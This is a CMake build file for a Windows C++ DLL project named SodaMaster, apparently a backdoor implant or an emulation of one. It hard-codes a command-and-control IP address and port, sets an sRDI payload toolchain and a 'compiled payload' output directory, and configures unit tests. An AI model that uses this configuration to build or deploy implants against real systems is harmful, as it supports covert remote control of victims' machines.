# For now, we will require cmake 3.10
cmake_minimum_required(VERSION 3.20)

# CMP0091 NEW is necessary to set MSVC_RUNTIME_LIBRARY for static builds. Otherwise it will silently fail
cmake_policy(SET CMP0091 NEW)

# Set CMAKE tool chain variable
set(CMAKE_TOOLCHAIN_FILE "$ENV{VCPKG_ROOT}/scripts/buildsystems/vcpkg.cmake" CACHE STRING "")
set(VCPKG_TARGET_TRIPLET x64-windows-static)
set(VCPKG_DEFAULT_HOST_TRIPLET x64-windows-static)

# For now, the project version is 1.0 TODO in the future - update to better version

set(MSVC_RUNTIME "static")
# Specify the C++ standard
set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED True)
set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} /Os /MT /Zc:threadSafeInit-")
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /MANIFEST:NO")
set(CMAKE_SHARED_LINKER_FLAGS "${CMAKE_SHARED_LINKER_FLAGS} /MANIFEST:NO")
project(SodaMaster VERSION 1.0)
set(VCPKG_CXX_FLAGS "/Zc:threadSafeInit- /DCRYPTOPP_CXX11_STATIC_INIT=0")
set(VCPKG_C_FLAGS "/Zc:threadSafeInit- /DCRYPTOPP_CXX11_STATIC_INIT=0")
set(VCPKG_OVERLAY_TRIPLETS "${CMAKE_CURRENT_SOURCE_DIR}/cmake/srdi-triplets")
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")

# Global configuration settings that we want multiple targets to have access to
if (NOT DEFINED C2_PORT)
    set(C2_PORT "80")
endif()
if (NOT DEFINED C2_IP_ADDRESS)
    set(C2_IP_ADDRESS "121.93.44.121")
endif()
if (NOT DEFINED DEBUG_MSG)
    set(DEBUG_MSG 0) # Set to 0 to remove debug text. Set to 1 to enable debug text.
endif()

add_definitions(-DC2_IP_ADDRESS="${C2_IP_ADDRESS}" -DC2_PORT="${C2_PORT}" -DDEBUG_MSG=${DEBUG_MSG})

message(STATUS "C2_PORT is ${C2_PORT}")
message(STATUS "C2_ADDRESS is ${C2_IP_ADDRESS}")
message(STATUS "DEBUG MESSAGES is ${DEBUG_MSG}")



# include vcpkg
include("$ENV{VCPKG_ROOT}/scripts/buildsystems/vcpkg.cmake")

# set compiled payload output directory
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR}/bin)

set(CRYPTOPP "cryptopp::cryptopp")

find_package(cryptopp CONFIG REQUIRED)

#find_package(cryptopp CONFIG REQUIRED)
find_path(WINSOCK_INCLUDE_DIR WinSock2.h)
if(MSVC)
  find_library(WINSOCK_LIBRARY mswsock.lib)
  find_library(WINSOCK2_LIBRARY ws2_32.lib)
  find_library(WINSOCK2_LIBRARY bcrypt.lib)
else()
  find_library(WINSOCK_LIBRARY mswsock)
  find_library(WINSOCK2_LIBRARY ws2_32)
  find_library(WINSOCK2_LIBRARY bcrypt)
endif()

# Handle the REQUIRED argument and set WINSOCK_FOUND
include(FindPackageHandleStandardArgs)
find_package_handle_standard_args(WinSock DEFAULT_MSG WINSOCK_LIBRARY WINSOCK2_LIBRARY WINSOCK_INCLUDE_DIR)

mark_as_advanced(WINSOCK_INCLUDE_DIR)
mark_as_advanced(WINSOCK_LIBRARY)
mark_as_advanced(WINSOCK2_LIBRARY)

if(WINSOCK_FOUND)
  add_definitions(-DWINSOCK_SUPPORT)
  set(WINSOCK_LIBRARIES ${WINSOCK_LIBRARY} ${WINSOCK2_LIBRARY})
endif()
set(CMAKE_C_STANDARD_LIBRARIES "${CMAKE_C_STANDARD_LIBRARIES} -lwsock32 -lws2_32 -lbcrypt")
set(CMAKE_CXX_STANDARD_LIBRARIES "${CMAKE_CXX_STANDARD_LIBRARIES} -lwsock32 -lws2_32 -lbcrypt")

# Adding the header files needed for the source files
include_directories(${PROJECT_SOURCE_DIR}/include)

# Adding the directory for the SodaMaster library
add_subdirectory ("SodaMaster-DLL")

#
# Setting up Unit Tests
#

# Fetching google test library, used to facilitate unit tests. 
include(FetchContent)
FetchContent_Declare(
    googletest
    GIT_REPOSITORY https://github.com/google/googletest.git
    GIT_TAG release-1.12.1
)

# For Windows: Prevent overriding the parent project's compiler/linker settings
set(gtest_force_shared_crt ON CACHE BOOL "" FORCE)
FetchContent_MakeAvailable(googletest)

# Telling CMake that there are tests to look for.
enable_testing()
add_subdirectory ("tests")

# Adding the header files needed for the source files


# Creating the test executable
add_executable(
    unit_tests
    tests/tests.cpp
    SodaMaster-DLL/Core.cpp
    SodaMaster-DLL/Utilities.cpp
    SodaMaster-DLL/AVM.cpp
    SodaMaster-DLL/Comslib.cpp
    SodaMaster-DLL/EncUtils.cpp
    SodaMaster-DLL/NamedPipe.cpp
    SodaMaster-DLL/base64.cpp
)
# Link test executable with google test
target_link_libraries(
    unit_tests
    ${CRYPTOPP}
    GTest::gtest
    GTest::gtest_main
    GTest::gmock
    wsock32
    Ws2_32
    Mswsock
    AdvApi32
)

# Call the google test CMake framework, then call the gtest command.
include(GoogleTest)
gtest_discover_tests(unit_tests)